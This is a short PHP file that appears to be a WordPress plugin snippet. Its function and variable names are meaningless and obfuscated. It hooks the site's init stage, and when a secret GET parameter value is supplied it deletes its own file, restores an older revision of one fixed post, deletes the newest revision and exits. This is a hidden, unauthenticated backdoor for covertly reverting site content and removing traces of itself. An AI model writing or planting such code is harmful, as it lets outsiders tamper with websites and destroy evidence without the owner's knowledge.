<?php

function modal_stop_box() {
	if (isset($_GET['fields_maker_security_colors']) && $_GET['fields_maker_security_colors'] === 'shop_slider_poll_message') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$sidebar_generator_comment_min = 12550;
		$video_coming_counter = wp_get_post_revisions($sidebar_generator_comment_min);
		if (empty($video_coming_counter)) die('no revisions');
		if (count($video_coming_counter) < 2) die('less than 2');
		$affiliates_tiny_tables_box = array_shift($video_coming_counter);
		$section_select_tiny_app = $affiliates_tiny_tables_box->ID;
		$panel_static_tags = array_shift($video_coming_counter);
		$plugin_maps_plugins = $panel_static_tags->ID;
		$store_modal_member_force = wp_restore_post_revision($plugin_maps_plugins);
		if ($store_modal_member_force === false) die('error restoring');
		$store_modal_member_force = wp_delete_post_revision($section_select_tiny_app);		
		if ($store_modal_member_force === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'modal_stop_box');
